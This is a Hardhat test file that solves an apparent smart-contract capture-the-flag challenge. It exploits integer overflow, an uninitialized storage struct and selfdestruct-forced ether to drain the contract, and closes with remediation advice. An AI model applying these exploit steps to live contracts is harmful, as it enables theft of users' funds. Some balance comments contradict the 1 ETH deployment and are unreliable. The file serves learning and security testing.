import { ethers } from "hardhat";
import { expect } from "chai";
import { BigNumber } from "ethers";

describe("FiftyYearsChallenge", function () {
  it("should exploit storage misalignment and withdraw all funds early", async function () {
    const [attacker] = await ethers.getSigners();

    // Step 1: Deploy the challenge contract with 1 ETH
    const ChallengeFactory = await ethers.getContractFactory("FiftyYearsChallenge");
    const challenge = await ChallengeFactory.connect(attacker).deploy(attacker.address, {
      value: ethers.utils.parseEther("1.0"),
    });
    await challenge.deployed();
    console.log("Challenge deployed at:", challenge.address);

    // --- Exploit Step 1 ---
    // First upsert call: trigger timestamp overflow bypass
    // We use 2^256 - 1 days as timestamp, so the required check
    // timestamp >= lastUnlock + 1 days overflows and passes as valid.
    const ONE_DAY = 24 * 60 * 60;
    const DATE_OVERFLOW = BigNumber.from(2).pow(256).sub(ONE_DAY);

    const tx1 = await challenge.connect(attacker).upsert(1, DATE_OVERFLOW.toString(), {
      value: BigNumber.from(1), // sends 1 wei
    });
    await tx1.wait();
    console.log("First upsert with overflow timestamp executed");

    // --- Exploit Step 2 ---
    // Second upsert: send timestamp = 0 to reset head and insert a new unlocked entry.
    // Due to storage mismanagement:
    // - contribution.amount (1 wei) → overwrites queue.length (slot 0)
    // - contribution.timestamp (0) → overwrites head (slot 1)
    // Then queue.push increases queue.length and stores new entry.
    const tx2 = await challenge.connect(attacker).upsert(2, "0", {
      value: BigNumber.from(2), // sends 2 wei
    });
    await tx2.wait();
    console.log("Second upsert resets head to 0 with unlocked timestamp");

    // --- Note ---
    // The internal .amount value saved for contributions is msg.value + 1
    // due to internal state increment before struct storage.
    // So .amounts are actually 2 and 3 wei respectively (not 1 and 2),
    // totalling 5 wei required to withdraw.

    // Contract only holds 3 wei, we need to send 2 more wei via selfdestruct
    const AttackerFactory = await ethers.getContractFactory("FiftyYearsAttacker");
    const attackerContract = await AttackerFactory.connect(attacker).deploy(challenge.address, {
      value: BigNumber.from(2),
    });
    await attacker.provider!.waitForTransaction(attackerContract.deployTransaction.hash);
    console.log("Sent 2 extra wei via selfdestruct attacker contract");

    // --- Exploit Step 3 ---
    // Call withdraw(2) to drain the contract now that head == 0 and
    // queue[2].unlockTimestamp == 0 (unlocked).
    const withdrawTx = await challenge.connect(attacker).withdraw(2);
    await withdrawTx.wait();
    console.log("Withdraw successful");

    const isComplete = await challenge.isComplete();
    expect(isComplete).to.be.true;
    console.log("Challenge solved: contract balance is 0");

    // --- Remediation Note ---
    // This contract is vulnerable due to:
    // 1. Using an uninitialized struct (contribution) in storage context
    //    without assigning it to a valid storage reference.
    //    This causes writes to critical storage slots (slot 0 and 1).
    //
    // 2. Lack of overflow checks (pre-Solidity 0.8) allows bypassing timestamp requirements.
    //
    // 3. queue.push() order of operations causes .amount = msg.value + 1,
    //    leading to internal state inconsistency and underfunded contract state.
    //
    // Recommended Fixes:
    // - Always initialise structs with explicit memory/storage location
    // - Migrate to Solidity >= 0.8.x to enable automatic overflow protection
    // - Refactor queue push logic to prevent reentrancy and value misalignment
  });
});
